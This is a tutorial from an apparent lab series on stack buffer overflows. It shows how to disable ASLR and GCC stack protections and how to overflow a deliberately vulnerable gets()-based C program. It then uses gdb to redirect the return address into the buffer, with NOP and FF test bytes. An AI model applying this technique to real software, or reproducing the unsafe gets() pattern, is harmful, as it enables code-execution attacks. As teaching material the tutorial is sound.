# StackOverflow Level 3

> Level 3 and Level Final will be aimed at the holy grail of overflow attaching -- Execute any code you want.

## Goal
1. Setup the experiment environment
2. Try to execute `FF`s in stack, triggering the "invalid instruction" fault
3. Use `NOP` for the first time, and check the solution by `gdb`

## Environment
Different from the previous levels, this level needs us to setup the special experiment environment under Linux. The normal Linux and `gcc` will have some stack attacking prevention facilities on, causing great trouble for any trouble makers.

### Stop memory address randomization
Execute `sysctl -w kernel.randomize_va_space=0` with root privilege in your Linux shell.

Without turning it off, you can play with the following code:

    // Some code
    #include <stdio.h>
    void test(){
      char buf[10];
      printf("The buffer address: %x\n", buf);
    }
    int main(){
      test();
      return 0;
    }


You will find that, the output will differ greatly every time. So, in order to simplify the problem, we will stop Linux kernel to do this protection, i.e., to stabilize the stack. After turning it off, the output in the above program will stay the same.

### Stop stack protection
Execute `sysctl -w kernel.exec-shield=0` with root privilege.

NOTE: However, if you are using the same platform as mine, i.e. Ubuntu 14.04, you will not find this available. Just ignore it in this case.

### GCC stack protection related options:
* `-fno-stack-protector`
* `-z execstack`

The first one is stopping GCC to insert "guard" or "flag" in the stack. If you smashed the stack, the guard would also be smashed. So the program would know the attacking.

The second one is to make code in stack "executable", by linker. By default, executing instruction in stack will cause `segmentation fault`.

## Grab the information
The code to exploit is like fellowing:

    \\test.c
    #include <stdio.h>
    #define BUF_SIZE 2000
    int a = 0;
    int readBuf(){
      char buf[BUF_SIZE];
      gets(buf);
      printf("The address of buffer: %x\n", buf);
      return 0;
    }
    
    void test(){
      readBuf();
      if(a != 1)
      printf("Return normally :(\n");
      else
      printf("haha, you hacked it! :)\n");
    }
    
    int main(){
      test();
      return 0;
    }


We compile it like : `gcc test.c -o0 -fno-stack-protector -z execstack -g -o test`. The `-g` option will attach the symbol table to the program, which will also greatly facilitate the exploiting by `gdb`.

NOTE: The reason why we use such a long buffer, which is 2000 bytes, is that it is closer to the real world buffer setting. People will always suppose that 2000 bytes of buffer is large enough :)

Our goal in this level is pretty simple -- To execute code from the start of our input string. In order to do this, we need to overwrite the return address in the stack as the previous tutorials. But, this time, we needs to set it to the start of buffer in the stack.

We use `gdb` to do some research. After loading the program binary, set breakpoint to `readBuf`. Then `run` directly, we get to the break point:

    40057d:       55                      push   %rbp
    40057e:       48 89 e5                mov    %rsp,%rbp
    400581:       48 81 ec d0 07 00 00    sub    $0x7d0,%rsp

So, we can use `%rsp` after `sub` as the start address of the buffer. You will find that, the start 4 byte of address is __not so obvious__. In Ubuntu, it is `000 00 7f ff`, and it might differ in other platform. So, the return address to append at the end of input would be:

    90 e2 ff ff 
    ff 7f 00 00

So, how long shall our attacking string be? According to the previous knowledge, it should be 2000 + 8 + 8 = 2016 bytes. Quite a long one. So, to generate such a long string easily, we use `perl` here:

     perl -e "print 'FF 'x2008" > string

Now, we can append the forged return address to the end of our prepared string, `hex2raw` it. Then, we can `./test < hex_str`. If you get error `illegal instruction`, you are probably right by hitting the `FF`s. Since there is no good opcode starting with `FF`.

## Check it out
Next, we want to try `NOP` for the first time, and use it to check if our solution makes sense.

First, we will substitute, let's say, 4 bytes of `FF`s at the front of string with `90`s. `0x90` is `NOP` in x86 ISA, which will be directly ignored by CPU.

If our solution makes sense, we will get the same error when we run out of `NOP`s and bumped into `FF`s, but ending at somewhere different from the start of buffer. Did you get it right? You can checkout the `%eip` when error happened in `gdb`.

    0x00007fffffffe294 in ?? ()

Great.